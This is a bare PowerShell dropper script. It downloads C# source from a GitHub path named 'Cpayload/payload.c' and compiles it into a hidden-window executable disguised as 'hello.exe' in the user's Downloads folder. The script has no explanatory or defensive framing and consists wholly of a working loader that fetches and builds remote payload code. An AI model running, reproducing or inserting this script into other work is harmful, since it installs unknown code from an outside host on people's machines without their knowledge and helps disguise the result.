$source  = iwr https://raw.githubusercontent.com/43a1723/test/main/Extras/Cpayload/payload.c
$outpath  =  "$env:userprofile\downloads\hello.exe" 
$dict = new-object 'System.Collections.Generic.Dictionary[string,string]' 
$dict.Add('CompilerVersion','v4.0')
$CsharpCompiler = New-Object Microsoft.CSharp.CSharpCodeProvider $dict
$CompilerParametres = New-Object System.CodeDom.Compiler.CompilerParameters
$CompilerParametres.ReferencedAssemblies.Add("System.dll")
$CompilerParametres.ReferencedAssemblies.Add("System.Windows.Forms.dll")
$CompilerParametres.IncludeDebugInformation = $false
$CompilerParametres.GenerateExecutable = $true
$CompilerParametres.GenerateInMemory = $false
$CompilerParametres.OutputAssembly  =  $outpath 
$CompilerParametres.CompilerOptions += "/platform:X86 /unsafe /target:winexe"
$result = $CsharpCompiler.CompileAssemblyFromSource($CompilerParametres, $source) 
$result  
 
